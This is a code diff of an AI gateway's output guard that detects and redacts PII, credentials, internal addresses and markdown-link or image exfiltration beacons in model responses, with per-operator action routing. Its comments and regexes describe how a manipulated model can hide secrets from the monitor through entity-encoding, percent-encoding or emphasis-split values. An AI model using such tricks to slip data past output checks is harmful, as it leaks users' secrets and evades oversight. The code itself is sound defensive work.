+            return enforced
 
-        if _enabled("output_pii_enabled", True):
-            pii_action = _action("output_pii_action", "redact")
-            if pii_action != "allow":
-                pii_verdict = await self._check_pii_secrets(text, pii_action)
-                if pii_verdict.action != "allow":
-                    verdicts.append(pii_verdict)
+        def _operator_action_for_category(threat_type: str) -> str:
+            """FULL OPERATOR CONTROL (2026-07-16): map a tier-2 guard-model finding
+            to the OPERATOR's configured per-detector action. The guard model only
+            DETECTS; the operator decides the ACTION. Returns 'allow' (drop the
+            finding) when the operator disabled that detector or set it to allow, so
+            the guard model can never impose an action the operator did not choose.
+            """
+            t = str(threat_type or "").lower()
+            # Whole-word tokens. Routing below matches TOKENS (not bare substrings)
+            # wherever a word is short/ambiguous, so a label can no longer be stolen
+            # by an unrelated category that merely contains those letters
+            # ('uncertain_claim' no longer matches the credential word 'cert';
+            # 'zip_code' no longer matches the infra token 'ip').
+            tokens = {tok for tok in re.split(r"[^a-z0-9]+", t) if tok}
+
+            # ALREADY-MASKED IS NOT A LEAK: a guard "masking-detection" finding
+            # (e.g. PII_MASKING_DETECTION) means the value is ALREADY masked in the
+            # output — no raw data to protect → no action, mirroring the static
+            # *_smart_masked handling in _check_pii_secrets. Guarded by an evasion
+            # check so an ADVERSARIAL label ('masking_bypass', 'unmasking_attempt')
+            # is NOT silently swallowed into "allow".
+            if (tokens & {"masked", "masking"}) and not (
+                tokens & {"bypass", "attempt", "evasion", "evade", "unmask", "unmasking", "circumvent"}
+            ):
+                return "allow"
+
+            # ORDER IS LOAD-BEARING: credential and ip_leakage are matched BEFORE
+            # pii. Generic PII words collide with other categories' labels —
+            # 'personal_access_token' contains 'personal' and 'ip_address' contains
+            # 'address'. Matching pii first routed those findings to the PII
+            # detector; under a legitimate asymmetric config (e.g.
+            # output_pii_action="allow" + output_credential_action="block") the
+            # finding hit the DISABLED pii detector and was dropped, so the
+            # operator's credential="block" was never honored (fail-open).
+            if any(k in t for k in (
+                "connection_string", "private_key", "access_key", "secret_key",
+                "sensitive_info", "sensitive_information", "information_disclosure",
+                "data_leak", "dataleak", "llm06", "api_key", "apikey",
+            )) or (tokens & {
+                "secret", "secrets", "credential", "credentials", "password",
+                "token", "tokens", "bearer", "certificate", "cert", "key", "keys",
+            }):
+                return _action("output_credential_action", "redact") if _enabled("output_credential_enabled", True) else "allow"
+            if any(k in t for k in ("ip_leak", "ip_leakage", "infrastructure", "internal_url")) or (
+                tokens & {"ip", "hostname"}
+            ):
+                return _action("output_ip_leakage_action", "redact") if _enabled("output_ip_leakage_enabled", True) else "allow"
+            if tokens & {"pii", "phi", "pci", "ssn", "email", "phone", "address", "personal"}:
+                return _action("output_pii_action", "redact") if _enabled("output_pii_enabled", True) else "allow"
+            if "hallucinat" in t:
+                return _action("output_hallucination_action", "flag")
+            # policy_violation / compliance / jailbreak / injection / toxic / guard_model / unknown
+            return _action("output_policy_action", "block") if _enabled("output_policy_enabled", True) else "allow"
+
+        # PII + CREDENTIAL share ONE scan of the output, but each class is governed by
+        # its OWN operator-selected action (see _check_pii_secrets). This gate is
+        # deliberately (pii OR credential) — NOT nested under output_pii_enabled.
+        # Previously the scan ran only when the PII detector was enabled AND not
+        # "allow", so an operator who set PII=allow (or disabled PII) while setting
+        # Credential=block never had the output scanned at all and raw API keys
+        # EGRESSED despite an explicit block. Each class below is still independently
+        # gated, so nothing is enforced that the operator did not select.
+        _pii_on = _enabled("output_pii_enabled", True)
+        _cred_on = _enabled("output_credential_enabled", True)
+        if _pii_on or _cred_on:
+            _pii_act = _action("output_pii_action", "redact") if _pii_on else "allow"
+            _cred_act = _action("output_credential_action", "redact") if _cred_on else "allow"
+            if _pii_act != "allow" or _cred_act != "allow":
+                for _v in await self._check_pii_secrets(
+                    text, _pii_act, credential_action=_cred_act
+                ):
+                    if _v.action != "allow":
+                        verdicts.append(_v)
 
         if _enabled("output_credential_enabled", True):
             # 1.7 policy "redact the response": output secrets/credentials are
@@ -248,25 +880,27 @@ class OutputGuard:
                 "output_ip_leakage_action",
                 "block" if self._config.get("output_block_on_ip_leakage", False) else "redact",
             )
-            # R2/E15: ip_leakage is a heuristic, false-positive-prone signal (a single
-            # private/example IP in an educational answer is benign), so it must never
-            # DESTROY the whole response: a whole-response "rewrite" is softened, and a
-            # hard "block" is only honoured when the org EXPLICITLY opted in via
-            # output_block_on_ip_leakage. BUT a REAL internal address that survives FP
-            # suppression (the example-address carve-out + the tier-2 guard_rated_clean
-            # drop below) must be NEUTRALISED, not egressed raw — so the floor is now
-            # "redact" (surgical mask of the infra token), matching PII's always-redact
-            # behaviour, instead of the old "flag" that let it leak in monitor-mode orgs.
-            if ip_action in ("rewrite", "flag"):
-                ip_action = "redact"
-            elif ip_action == "block" and not self._config.get("output_block_on_ip_leakage", False):
-                ip_action = "redact"
+            # FULL OPERATOR CONTROL (2026-07-16): the configured output_ip_leakage_action
+            # is honoured EXACTLY (block/redact/rewrite/flag/allow) — no coercion to
+            # redact. ip_leakage is FP-prone, so the DEFAULT (when the org has no
+            # explicit opinion) is still "redact" (see the _action() default above),
+            # but an operator who deliberately selects flag/rewrite/block gets that
+            # action. This mirrors the honesty contract the §1.7 UI advertises.
             if ip_action != "allow":
                 ip_verdict = self._check_ip_leakage(text, ip_action)
                 if ip_verdict.action != "allow":
                     verdicts.append(ip_verdict)
 
-        if cfg.get("hallucination_flag_enabled", self._config.get("hallucination_flag_enabled", True)):
+        # UI enable is `factuality_check_enabled` (control); sync maps it to
+        # `hallucination_flag_enabled`. OR the two so a stale/partial bundle
+        # cannot leave §1.7 Hallucination OFF while the UI toggle is ON.
+        if "hallucination_flag_enabled" in cfg or "factuality_check_enabled" in cfg:
+            _hall_enabled = bool(cfg.get("hallucination_flag_enabled")) or bool(
+                cfg.get("factuality_check_enabled")
+            )
+        else:
+            _hall_enabled = bool(self._config.get("hallucination_flag_enabled", True))
+        if _hall_enabled:
             hall_action = _action("output_hallucination_action", "flag")
             if hall_action != "allow":
                 hall_verdict = await self._check_hallucination_markers(
@@ -283,6 +917,16 @@ class OutputGuard:
             leakage_verdict = self._check_semantic_leakage(text)
             if leakage_verdict.action != "allow":
                 verdicts.append(leakage_verdict)
+
+        # G13: neutralize output-side data-exfiltration channels (markdown image /
+        # link / bare URL smuggling data to an external host). Redactable + delivered
+        # 200 (defang the beacon, keep the answer); never whole-response blocked.
+        if _enabled("output_exfil_enabled", True):
+            exfil_action = _action("output_exfil_action", "redact")
+            if exfil_action != "allow":
+                exfil_verdict = self._check_exfil_channel(text, exfil_action)
+                if exfil_verdict.action != "allow":
+                    verdicts.append(exfil_verdict)
 
         # ── Tier-2: ZeroShield guard model (ML) on the OUTPUT ───────────────
         # Mirrors INPUT scanning: the static detectors above are tier-1; the
@@ -319,7 +963,23 @@ class OutputGuard:
                     and t2.action not in ("block", "redact", "flag")
                 ):
                     guard_rated_clean = True
-                if t2 is not None and t2.action in ("block", "redact", "flag"):
+                # FULL OPERATOR CONTROL (2026-07-16): the guard model DETECTS
+                # (t2.action != allow); the OPERATOR's configured per-detector action
+                # for the detected category decides what happens. This replaces the
+                # guard model's own block/redact/flag recommendation, so setting a
+                # detector to "flag"/"allow" is honoured even when the guard would
+                # have blocked. A category the operator set to "allow" (or disabled)
+                # maps to "allow" here and the finding is dropped.
+                _t2_op_action = (
+                    _operator_action_for_category(t2.threat_type)
+                    if t2 is not None
+                    else "allow"
+                )
+                if (
+                    t2 is not None
+                    and t2.action in ("block", "redact", "flag")
+                    and _t2_op_action != "allow"
+                ):
                     t2_patterns = list(getattr(t2, "matched_patterns", []) or [])
                     # Defense-in-depth (M-01): the guard-model ScanVerdict can carry
                     # raw evidence/findings (matched fragments of the model output) in
@@ -328,17 +988,34 @@ class OutputGuard:
                     # value out of them here as a belt-and-suspenders to the scanner.py
                     # source fix. redact_all is a no-op on plain pattern-key strings.
                     t2_compliance_tags = get_compliance_tags(t2_patterns)
-                    t2_patterns = [redact_all(str(p)) for p in t2_patterns]
+                    # G10: keep the RAW guard-model evidence spans so the sanitizer can
+                    # mask semantically-detected PII/secret that redact_all has no regex
+                    # for (free-text names, non-standard layouts, passphrases). Only for
+                    # redactable categories, and only value-like spans (see
+                    # _redaction_spans_from). These stay INTERNAL (never serialized to
+                    # the client/telemetry); the display copy below is still masked.
+                    t2_redaction_spans = (
+                        _redaction_spans_from(t2_patterns, t2.threat_type or "")
+                        if _t2_op_action in ("block", "redact")
+                        else []
+                    )
+                    # G16: mask RAW evidence VALUES (free-text names/passphrases that
+                    # redact_all is a no-op on) in the client-facing display copy while
+                    # keeping category labels ("ssn"/"email") readable — matched_patterns
+                    # flows to the client enforcement envelope, so a raw value here would
+                    # leak the just-redacted content back through metadata.
+                    t2_patterns = [_mask_evidence_span(str(p), t2.threat_type or "") for p in t2_patterns]
                     t2_detail = redact_all(
                         t2.detail or "ZeroShield guard model (tier-2) flagged output"
                     )
                     verdicts.append(OutputVerdict(
-                        action=t2.action,
+                        action=_t2_op_action,
                         threat_type=t2.threat_type or "guard_model",
                         confidence=float(getattr(t2, "confidence", 0.0) or 0.0),
                         detail=t2_detail,
                         matched_patterns=t2_patterns,
                         compliance_tags=t2_compliance_tags,
+                        redaction_spans=t2_redaction_spans,
                     ))
             except Exception:  # noqa: BLE001 - output tier-2 must never break delivery
                 # M11: fail-open (never block an already-generated response on a
@@ -362,8 +1039,25 @@ class OutputGuard:
         # letting a tier-2 "clean" rating silently drop the verdict would override
         # the org's explicit policy. Default orgs (no opt-in) still get the FP
         # reduction; opt-in orgs get deterministic blocking tier-2 cannot undo.
-        _ip_hard_block = bool(self._config.get("output_block_on_ip_leakage", False))
-        if guard_rated_clean and verdicts and not _ip_hard_block:
+        # FULL OPERATOR CONTROL (2026-07-16): the guard-rated-clean FP-reduction for
+        # the noisy static ip_leakage heuristic is only applied when the operator has
+        # NOT expressed an explicit ip-leakage opinion. An EXPLICIT choice wins and
+        # the guard model cannot silently drop the verdict.
+        #
+        # 2026-07-17 FIX: this gate was `_ip_op_action != "allow"`, which is true for
+        # every action except "allow" — but "allow" skips the detector entirely
+        # above, so no ip_leakage verdict exists to drop. The FP-reduction was
+        # therefore UNREACHABLE (dead), contradicting the comment above it: benign
+        # textbook IPs the tier-2 guard had cleared were redacted instead of
+        # suppressed. Gate on whether the operator EXPLICITLY configured ip-leakage
+        # (key present, or the legacy hard-block opt-in) rather than on the action's
+        # value, which restores "default orgs still get the FP reduction; opt-in
+        # orgs get deterministic blocking tier-2 cannot undo".
+        _ip_explicit = (
+            bool(self._config.get("output_block_on_ip_leakage", False))
+            or "output_ip_leakage_action" in cfg
+        )
+        if guard_rated_clean and verdicts and not _ip_explicit:
             verdicts = [v for v in verdicts if str(getattr(v, "threat_type", "")) != "ip_leakage"]
 
         if not verdicts:
@@ -371,44 +1065,174 @@ class OutputGuard:
 
         selected = self._select_highest_severity(verdicts)
         selected.scan_degraded = selected.scan_degraded or output_scan_degraded
-        # 1.7 policy: PII / secrets / credentials are SURGICALLY REDACTED and the
-        # response delivered (200) — never whole-response blocked. If any detector
-        # (static or tier-2 guard model) escalated a redactable category to "block",
-        # downgrade to "redact" so the offending tokens are masked in place. Non-
-        # redactable threats (jailbreak/injection/hallucination/etc.) still block.
-        # C-1: the tier-2 guard model emits pci (card numbers) and phi (health
-        # info) as DISTINCT categories from pii — they are equally redactable, so
-        # they must be in the downgrade set too, or a benign answer that happens
-        # to contain a card/MRN gets whole-response HARD-BLOCKED (403) instead of
-        # surgically masked-and-served (200), contradicting the §1.7 contract.
-        if selected.action == "block" and str(selected.threat_type or "") in _REDACTABLE_OUTPUT_CATEGORIES:
-            selected.action = "redact"
+        # STRICTLY-WHAT-THE-OPERATOR-SELECTED: record which detector classes the
+        # operator actually set to REDACT. Only those may be mutated by the
+        # sanitizer. Without this, one class set to "redact" caused the blanket
+        # redact_all() to mask EVERY class, so a class set to flag/allow was
+        # mutated anyway (measured: PII=flag + Credential=redact masked the email).
+        # A class qualifies when the operator required its data to be REMOVED from the
+        # delivered bytes — that is "redact" OR "rewrite". Restricting this to
+        # "redact" alone LEAKED: ACTION_PRIORITY ranks redact(3) above rewrite(2), so
+        # with PII=redact + Credential=rewrite the PII verdict won,
+        # _select_highest_severity discarded the credential verdict, and the API key
+        # EGRESSED RAW even though the operator had asked for it to be rewritten
+        # away (symmetrically, PII=rewrite + Credential=redact leaked the email).
+        # Whichever verdict wins delivery, every class the operator chose to protect
+        # must still be scrubbed. Classes set to flag/allow/off are NEVER included,
+        # so this cannot mutate a class the operator left untouched.
+        _PROTECTIVE_MUTATIONS = ("redact", "rewrite")
+        _redactable_classes: list[str] = []
+        if _enabled("output_pii_enabled", True) and _action("output_pii_action", "redact") in _PROTECTIVE_MUTATIONS:
+            _redactable_classes.append("pii")
+        if _enabled("output_credential_enabled", True) and _action("output_credential_action", "redact") in _PROTECTIVE_MUTATIONS:
+            _redactable_classes.append("credential")
+        if _enabled("output_ip_leakage_enabled", True) and _action(
+            "output_ip_leakage_action",
+            "block" if self._config.get("output_block_on_ip_leakage", False) else "redact",
+        ) in _PROTECTIVE_MUTATIONS:
+            _redactable_classes.append("ip_leakage")
+        selected.redact_classes = _redactable_classes
+        # FULL OPERATOR CONTROL (2026-07-16): the configured action is honoured
+        # EXACTLY. Previously a redactable category (pii/pci/phi/secret/credential)
+        # escalated to "block" was silently downgraded to "redact" (the §1.7
+        # "surgically redact, never whole-block" floor). That made the "block"
+        # selection indistinguishable from "redact" in the UI + pipeline trace.
+        # Operators now own the choice: selecting "block" whole-response-blocks
+        # (403) even for redactable categories; "redact" masks in place. The
+        # per-detector _action() default remains a sensible value (redact for PII),
+        # so orgs with no explicit opinion are unchanged.
+        #
+        # I-25: stamp the §1.7 human-review intent onto the winning verdict. Set only
+        # when the operator configured ``human_review`` for a detector that actually
+        # fired (_action() records it during resolution), so no other posture is
+        # affected. Downstream this rides the existing review_required plumbing to
+        # telemetry and the X-ZeroShield-Review-Required response header.
+        if _review_requested and selected.action != "allow":
+            selected.review_required = True
         return selected
 
-    async def _check_pii_secrets(self, text: str, action: str = "redact") -> OutputVerdict:
-        """Delegate PII/secret detection to the existing scanner."""
+    async def _check_pii_secrets(
+        self,
+        text: str,
+        action: str = "redact",
+        *,
+        credential_action: str | None = None,
+    ) -> list[OutputVerdict]:
+        """Detect raw PII/credential leakage and govern each CLASS by its OWN action.
+
+        Returns a LIST of verdicts (0, 1 or 2): at most one PII-class verdict governed
+        by the operator's ``output_pii_action`` and at most one CREDENTIAL-class verdict
+        governed by ``output_credential_action``.
+
+        WHY THE SPLIT (2026-07-20). ``PII_PATTERNS`` contains credential keys
+        (api_key_openai, aws_access_key, aws_secret_access_key, github_token,
+        private_key_header), so ``scan_output`` reported an API key as
+        ``threat_type='pii'`` and the guard governed it with ``output_pii_action``. The
+        operator's "Credential Exposure" action was therefore POWERLESS for API keys.
+        Measured before this fix:
+            PII=block, CRED=off   -> block   (PII action governed the API key)
+            PII=off,   CRED=block -> allow   (credential action did nothing)
+            PII=allow, CRED=block -> allow   (★ operator chose BLOCK; keys EGRESSED)
+        The same mis-governance applied to the whole ``threat_type='secret'`` family
+        (password_assignment, anthropic_key, gitlab_pat, api_key_assignment, ...).
+
+        PARTITION BY COMPLIANCE TAG, NOT A HARDCODED KEY LIST: a matched key is
+        CREDENTIAL-class iff its ``COMPLIANCE_TAG_MAP`` tags contain "SECRET". That map
+        is the authoritative classification already used for compliance reporting, so a
+        future SECRET-tagged pattern is routed correctly with no code change (a literal
+        key set would silently fail open as patterns are added).
+
+        ``action`` governs the PII class; ``credential_action`` governs the credential
+        class. Passing ``None``/"allow" for either DISABLES that class entirely (the
+        operator selected allow, or turned the detector off) — the other class is still
+        enforced, which is the whole point of independent per-detector control.
+        """
+        pii_action = action
+        cred_action = credential_action
         verdict = await self._scanner.scan_output(text)
+        out: list[OutputVerdict] = []
         if verdict.threat_type in ("pii", "secret") and verdict.matched_patterns:
-            pattern_keys = verdict.matched_patterns
+            pattern_keys = list(verdict.matched_patterns)
             matched_values = dict(getattr(verdict, "matched_values", None) or {})
-            value_detail = ""
-            if matched_values:
-                # detail is client-facing: embed MASKED values only.
-                # matched_values keeps the raw values for operator telemetry.
-                value_detail = " — " + ", ".join(
-                    f"{k}={_mask_value_for_detail(v)}"
-                    for k, v in matched_values.items()
+            # ALREADY-MASKED IS NOT A LEAK (2026-07-16): a "*_smart_masked" match means
+            # the value is ALREADY masked in the model output (j***@a***.com,
+            # ***-**-6789) — there is NO raw sensitive data to protect, so it is NOT a
+            # PII leak and MUST NOT trigger any enforcement action (block/redact/rewrite/
+            # flag). "pii" means actual raw data is present; when the model itself
+            # already produced a redacted/masked value there is nothing to act on. Drop
+            # the already-masked shapes; the operator's configured action applies only to
+            # GENUINELY RAW PII. If EVERY match was already masked, the output is clean →
+            # no verdict (delivered unchanged, NO action). This is a DETECTION
+            # correction, not an action override — full operator control is preserved for
+            # real leaks (a raw email alongside a masked one still triggers the action).
+            # ORDER IS LOAD-BEARING: drop already-masked shapes BEFORE partitioning.
+            # Partitioning the pre-filter key set would let an all-masked output produce
+            # a spurious credential/PII verdict, breaking the frozen no-action contract.
+            _raw_keys = [k for k in pattern_keys if not str(k).endswith("_smart_masked")]
+            if not _raw_keys:
+                return []
+            pattern_keys = _raw_keys
+            matched_values = {
+                k: v for k, v in matched_values.items() if not str(k).endswith("_smart_masked")
+            }
+
+            def _is_credential(key: str) -> bool:
+                # Authoritative classification via COMPLIANCE_TAG_MAP (see docstring).
+                return "SECRET" in (get_compliance_tags([key]) or [])
+
+            _cred_keys = [k for k in pattern_keys if _is_credential(k)]
+            _pii_keys = [k for k in pattern_keys if not _is_credential(k)]
+
+            def _build(keys: list[str], act: str, threat: str) -> OutputVerdict:
+                # Per-class metadata: patterns/values/detail/compliance tags are derived
+                # from THIS class's keys only, so a credential incident is never tagged
+                # GDPR/PII and a PII incident is never tagged SECRET (attribution).
+                vals = {k: v for k, v in matched_values.items() if k in set(keys)}
+                detail_vals = ""
+                if vals:
+                    # detail is client-facing: embed MASKED values only.
+                    # matched_values keeps the raw values for operator telemetry.
+                    detail_vals = " — " + ", ".join(
+                        f"{k}={_mask_value_for_detail(v)}" for k, v in vals.items()
+                    )
+                label = "Credential" if threat == "credential" else "PII"
+                return OutputVerdict(
+                    action=act,
+                    threat_type=threat,
+                    confidence=verdict.confidence,
+                    detail=f"{label} detected in output: {', '.join(keys)}{detail_vals}",
+                    matched_patterns=list(keys),
+                    matched_values=vals,
+                    compliance_tags=get_compliance_tags(list(keys)),
                 )
-            return OutputVerdict(
-                action=action,
-                threat_type=verdict.threat_type,
-                confidence=verdict.confidence,
-                detail=f"PII/secret detected in output: {', '.join(pattern_keys)}{value_detail}",
-                matched_patterns=pattern_keys,
-                matched_values=matched_values,
-                compliance_tags=get_compliance_tags(pattern_keys),
-            )
-        return OutputVerdict()
+
+            # Each class is enforced ONLY by its own operator-selected action. A class
+            # whose action is None/"allow" (detector disabled or set to allow) yields NO
+            # verdict, while the other class is still enforced independently.
+            if _pii_keys and pii_action and pii_action != "allow":
+                out.append(_build(_pii_keys, pii_action, "pii"))
+            if _cred_keys and cred_action and cred_action != "allow":
+                out.append(_build(_cred_keys, cred_action, "credential"))
+            return out
+        # ── FROZEN CONTRACT — ALREADY-MASKED OUTPUT TRIGGERS **NO** ACTION ──
+        # Do NOT add a flag/redact/rewrite here. This has regressed twice.
+        #
+        # A "*_smart_masked" shape (j***@a***.com, ***-**-6789, ****-****-****-1111)
+        # means the MODEL ITSELF already masked the value: there is NO raw sensitive
+        # data in the output, so there is NOTHING to detect and NOTHING to act on.
+        # "PII" means actual raw data is present. Already-masked output is therefore
+        # not a finding at all, and the guard returns an EMPTY verdict — no block, no
+        # redact, no rewrite, and NO FLAG.
+        #
+        # THE OPERATOR IS THE SOLE OWNER OF THEIR ORGANIZATION'S ACTIONS. The
+        # configured output_pii_action (block/redact/rewrite/flag/allow) applies ONLY
+        # to GENUINELY RAW PII. Emitting any action here — even a "harmless"
+        # visibility flag — imposes behavior the operator did not select (e.g. an org
+        # configured "rewrite" would see "flag" in the trace/telemetry), which is
+        # exactly the dishonesty this subsystem must never reintroduce. A raw email
+        # alongside a masked one still triggers the operator's action, via the
+        # _raw_keys path above.
+        return []
 
     def _check_credential_exposure(self, text: str, action: str = "block") -> OutputVerdict:
         """Check for exposed credentials (bearer tokens, connection strings, etc.)."""
@@ -498,6 +1322,52 @@ class OutputGuard:
                 compliance_tags=["DLP"],
             )
         return OutputVerdict()
+
+    def _check_exfil_channel(self, text: str, action: str = "redact") -> OutputVerdict:
+        """G13: detect data-exfiltration channels in the model output.
+
+        The client-facing ``detail`` names only the channel kind and destination
+        host (safe) — never the smuggled payload, which is masked by
+        :func:`neutralize_exfil_channels` on the sanitized egress.
+        """
+        findings = list(_scan_exfil_channels(text))
+        # G49: the URL scan hit its per-output budget — a benign single answer never has
+        # this many distinct URLs, a beacon could hide past the cap, and running the
+        # (uncapped) egress neutralizer on an output this large would be a soft-DoS. Fail
+        # CLOSED: block the output as a probable data-exfiltration / URL-flood pattern.
+        if any(k == _EXFIL_BUDGET_SENTINEL for k, _u, _r in findings):
+            return OutputVerdict(
+                action="block",
+                threat_type="exfil_channel",
+                confidence=0.6,
+                detail=(
+                    f"Output contains an unusually large number of URLs (> {_MAX_EXFIL_URLS}); "
+                    "blocked as a probable data-exfiltration / URL-flood pattern."
+                ),
+                matched_patterns=["exfil_url_flood"],
+            )
+        if not findings:
+            return OutputVerdict()
+        kinds = sorted({k for k, _u, _r in findings})
+        hosts: list[str] = []
+        for _k, url, _r in findings:
+            hm = re.match(r"https?://([^/?#]*)", url, re.IGNORECASE)
+            if hm and hm.group(1):
+                hosts.append(hm.group(1))
+        zero_click = any(k == "image" for k, _u, _r in findings)
+        host_list = ", ".join(sorted(set(hosts))[:3]) or "external host"
+        return OutputVerdict(
+            action=action,
+            threat_type="exfil_channel",
+            confidence=0.9 if zero_click else 0.8,
+            detail=(
+                f"Data-exfiltration channel in output "
+                f"({'/'.join(kinds)} -> {host_list}): smuggled payload neutralized"
+                + (" (zero-click auto-render defanged)" if zero_click else "")
+            ),
+            matched_patterns=[f"exfil_{k}" for k in kinds],
+            compliance_tags=["DLP"],
+        )
 
     async def score_hallucination(
         self,
@@ -733,9 +1603,16 @@ _REWRITE_SYSTEM_PROMPT = (
     "You are an output-sanitization assistant for an AI security gateway. You are "
     "given a model response that violated a safety policy. Rewrite it so the "
     "specific sensitive or unsafe content is removed or neutralized, while "
-    "PRESERVING the meaning, tone, and usefulness of everything else. Do not add "
-    "commentary, apologies, or meta explanations beyond what is requested. Output "
-    "ONLY the rewritten response text."
+    "PRESERVING the meaning, tone, and usefulness of everything else. "
+    "CRITICAL: replace each sensitive value with a short NATURAL-LANGUAGE "
+    "placeholder in square brackets that describes what was removed (e.g. "
+    "'[email removed]', '[phone number removed]', '[SSN removed]', "
+    "'[card number removed]', '[internal address removed]'). Do NOT invent "
+    "replacement names, email addresses, phone numbers, card numbers, SSNs, IP "
+    "addresses or other identifiers — the rewritten text must contain NO real or "
+    "fake sensitive identifiers of any kind. Do not add commentary, apologies, or "
+    "meta explanations beyond what is requested. Output ONLY the rewritten "
+    "response text."
 )
 
 _MAX_REWRITE_INPUT_CHARS = 8000
@@ -787,8 +1664,13 @@ def _content_preserving_rewrite(
     rewritten = _extract_converse_text(result)
     if not rewritten or not rewritten.strip():
         return None
-    # Final deterministic safety net: never let a residual secret/PII survive.
-    return redact_all(rewritten.strip())
+    # FULL-CONTROL HONESTY (2026-07-16): deliver the GENUINE rewrite; apply redact_all
+    # only as a RESIDUAL safety net when the rewrite model left a real PII/secret token
+    # behind (so a compliant rewrite is not blanket-masked into "[redacted]" and thus
+    # made indistinguishable from the redact action).
+    _clean = rewritten.strip()
+    _residual = redact_all(_clean)
+    return _residual if _residual != _clean else _clean
 
 
 def _extract_converse_text(result) -> str:
@@ -879,42 +1761,319 @@ async def rewrite_output_response_text_async(
     return await loop.run_in_executor(None, func)
 
 
+# G35: runs of HTML character-references or percent-encodings long enough to carry
+# a PII/secret value. A manipulated model can emit PII as &#..; / %.. so the raw
+# value never appears in the egress bytes, yet a browser/markdown renderer auto-
+# decodes it back to the PII. Mask the whole encoded run (not the value inside it),
+# so no position-mapping is needed. Benign entity/percent runs (colour hex, emoji,
+# ©/™, url path segments) do NOT decode to a PII/secret pattern and are preserved.
+_ENCODED_PII_RUN_RE = re.compile(
+    r"(?:&#x?[0-9a-fA-F]{1,6};){6,}|(?:%[0-9a-fA-F]{2}){6,}"
+)
+
+
+def _decode_encoded_run(run: str) -> str:
+    def _cp(n: int) -> str:
+        return chr(n) if 0 <= n < 0x110000 else ""
+    s = re.sub(r"&#x([0-9a-fA-F]{1,6});", lambda m: _cp(int(m.group(1), 16)) or m.group(0), run)
+    s = re.sub(r"&#(\d{1,7});", lambda m: _cp(int(m.group(1))) or m.group(0), s)
+    s = re.sub(r"%([0-9a-fA-F]{2})", lambda m: _cp(int(m.group(1), 16)) or m.group(0), s)
+    return s
+
+
+def neutralize_encoded_pii(text: str) -> str:
+    """Mask HTML-entity / percent-encoded runs in model output that DECODE to a
+    PII/secret value (output-side laundering; symmetric to input G33). Strict no-op
+    on benign encoded runs. Bounded single-pass regex (ReDoS-safe)."""
+    if not text or ("&#" not in text and "%" not in text):
+        return text
+
+    def _sub(m: "re.Match[str]") -> str:
+        decoded = _decode_encoded_run(m.group(0))
+        if detect_pii(decoded) or detect_secrets(decoded):
+            return "[ENCODED_PII_REDACTED]"
+        return m.group(0)
+
+    try:
+        return _ENCODED_PII_RUN_RE.sub(_sub, text)
+    except Exception:  # noqa: BLE001 - sanitizer must never break the egress
+        return text
+
+
+# G44: a token whose chars are interleaved with inline markdown emphasis/code markers,
+# where stripping them reveals a PII/secret (``1**2**3-45-6789`` -> SSN, ``john`@`x.com``
+# -> email). Disjoint char classes (word/PII vs emphasis) -> linear (ReDoS-safe).
+# G50/G51: intra-word render-invisible separators a renderer drops — markdown emphasis
+# (``*`` / `` ` ``; ``_`` stays literal per CommonMark) PLUS HTML comments / empty tags.
+# A value run interspersed with these visually reassembles, so match the whole run, strip
+# the separators, and re-detect. Each subpattern is bounded (``.*?`` closed by ``-->``,
+# ``[^>]*`` negated) and the two char classes are disjoint -> LINEAR (no ReDoS).
+# The comment body is CAPPED ({0,400}) — a real render-away obfuscation comment is tiny, and
+# an unbounded ``.*?`` re-scanned per value position is a ReDoS. Empty/self-closing tag bodies
+# are likewise negated-class bounded.
+_RENDER_INVIS_SEP = (
+    r"(?:[*`]"
+    r"|<!--.{0,400}?-->"
+    r"|<[a-zA-Z][a-zA-Z0-9]*\b[^>]{0,400}>\s*</[a-zA-Z]+\s*>"
+    r"|<[a-zA-Z][a-zA-Z0-9]*\b[^>]{0,400}/\s*>)"
+)
+_NUMERIC_ENTITY_RE = re.compile(r"&#(x[0-9a-fA-F]{1,6}|[0-9]{1,7});")
+_ENT = _NUMERIC_ENTITY_RE.pattern
+# TWO ReDoS-safe token passes (applied sequentially in neutralize_markdown_split_pii):
+#  1) EMPHASIS/HTML — VALUE-ANCHORED (a value char precedes any separator), so a match fails
+#     fast at a stray ``<`` and the bounded comment is never re-scanned per position.
+#  2) ENTITIES — a plain run of value chars OR numeric entities. Value chars and ``&`` are
+#     DISJOINT and the entity is bounded (no ``.*?``), so this is linear. The ``stripped !=
+#     run`` guard in ``_sub`` leaves a run with no separator (a plain value) untouched.
+# G52: numeric entities DECODE to a char (unlike the strip-to-nothing emphasis/HTML), so the
+# run is decoded, not stripped, before re-detection.
+# The value/separator repetitions are CAPPED (a real PII/secret value segment is short) so
+# each match ATTEMPT is O(cap), not O(len) — otherwise a long value run wrapped by a
+# separator char (``x<!-- <150KB> -->y``) makes re restart+backtrack O(n^2). Caps well above
+# any real obfuscated value; longer runs are simply not one value.
+# G79: the value-char runs are POSSESSIVE ({1,256}+). The separator always starts with a char
+# DISJOINT from the value class ([*`<] vs the value alternation), so backtracking a value run can never
+# help find a separator — greedy-without-giveback is semantically identical for any real match. Without
+# possessive, a long value-char OUTPUT with no separator (which the output path does NOT length-cap
+# like the 10k input cap) backtracks {1,256} at every start position -> O(256·n) (~1.5s for 200KB,
+# a soft output-side DoS). Possessive makes each start O(1) -> ~140ms for 200KB.
+# G91: the value class ALSO matches a NUMERIC HTML ENTITY (``&#49;``) so a value that is BOTH
+# markdown-emphasis-split AND entity-encoded (``&#49;*&#50;*&#51;...`` — a markdown renderer strips the
+# emphasis and the HTML parser then decodes the intact entities -> shows the value) is spanned as ONE
+# run; _sub strips the emphasis and decodes the entities before re-detecting. The entity branch starts
+# with ``&`` (disjoint from the [*`<] separator starts), so the possessive/disjoint ReDoS property holds.
+_EMPH_HTML_TOKEN_RE = re.compile(
+    rf"(?:[\w@.\-]|{_ENT}){{1,256}}+(?:{_RENDER_INVIS_SEP}{{1,64}}(?:[\w@.\-]|{_ENT}){{1,256}}+)+",
+    re.DOTALL,
+)
+_ENTITY_TOKEN_RE = re.compile(rf"(?:[\w@.\-]|{_ENT}){{1,512}}")
+_RENDER_INVIS_STRIP_RE = re.compile(_RENDER_INVIS_SEP, re.DOTALL)
+
+
+def _decode_numeric_entities(s: str) -> str:
+    """Decode numeric HTML entities (&#50; / &#x33;) to their char — a renderer does, so a
+    value split with them reassembles. Only numeric entities (the obfuscation vector);
+    named entities (&amp; etc.) are left alone to keep FP low."""
+    def _one(m: "re.Match[str]") -> str:
+        tok = m.group(1)
+        try:
+            cp = int(tok[1:], 16) if tok[0] in "xX" else int(tok)
+        except ValueError:  # pragma: no cover
+            return m.group(0)
+        return chr(cp) if 0 <= cp <= 0x10FFFF else m.group(0)
+
